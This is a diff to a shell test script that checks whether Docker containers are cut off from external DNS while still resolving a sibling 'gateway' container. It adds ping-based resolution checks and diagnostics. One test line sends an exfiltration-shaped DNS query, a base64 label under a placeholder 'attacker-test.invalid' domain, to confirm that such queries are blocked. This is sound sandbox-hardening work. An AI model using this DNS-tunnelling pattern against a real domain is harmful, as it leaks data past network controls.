@@ -36,9 +36,24 @@ for variant in default dns-none dns-loopback; do
   echo "== variant: $variant"
   docker exec "$c" cat /etc/resolv.conf | grep -E '^(nameserver|options)' | sed 's/^/   /'
   expect_fail "$variant: external name does not resolve (example.com)" docker exec "$c" nslookup -timeout=2 example.com
-  expect_fail "$variant: external name does not resolve via getaddrinfo" docker exec "$c" getent hosts example.com
+  # getaddrinfo path (busybox has no getent). ping prints "bad address" only when resolution
+  # itself fails, which distinguishes it from "resolved but unreachable".
+  ext_out="$(docker exec "$c" ping -c1 -W1 example.com 2>&1)"
+  case "$ext_out" in
+    *"bad address"*) result PASS "$variant: external name does not resolve via getaddrinfo" ;;
+    *) result FAIL "$variant: expected 'bad address' for example.com, got: ${ext_out:0:120}" ;;
+  esac
   if [ "$variant" = default ]; then
-    expect_ok "$variant: sibling 'gateway' resolves via embedded DNS" docker exec "$c" nslookup -timeout=2 gateway
+    if retry 5 docker exec "$c" ping -c1 -W1 gateway; then
+      result PASS "$variant: sibling 'gateway' resolves and answers via embedded DNS (getaddrinfo)"
+    else
+      result FAIL "$variant: sibling 'gateway' did not resolve/answer after 5 tries"
+      echo "        | resolv.conf: $(docker exec "$c" cat /etc/resolv.conf | tr '\n' ' ')"
+      echo "        | ping: $(docker exec "$c" ping -c1 -W1 gateway 2>&1 | head -3 | tr '\n' ' ')"
+      echo "        | nslookup: $(docker exec "$c" nslookup -timeout=2 gateway 2>&1 | head -6 | tr '\n' ' ')"
+      echo "        | network: $(docker network inspect "$NET" -f '{{json .Containers}}' | head -c 400)"
+      echo "        | docker: $(docker version -f '{{.Server.Version}}')"
+    fi
     # Does a TXT/long-label query reach an upstream? Fire exfil-shaped queries.
     docker exec "$c" nslookup -timeout=2 "aGVsbG8tZXhmaWw.$(date +%s).attacker-test.invalid" >/dev/null 2>&1 || true
   fi
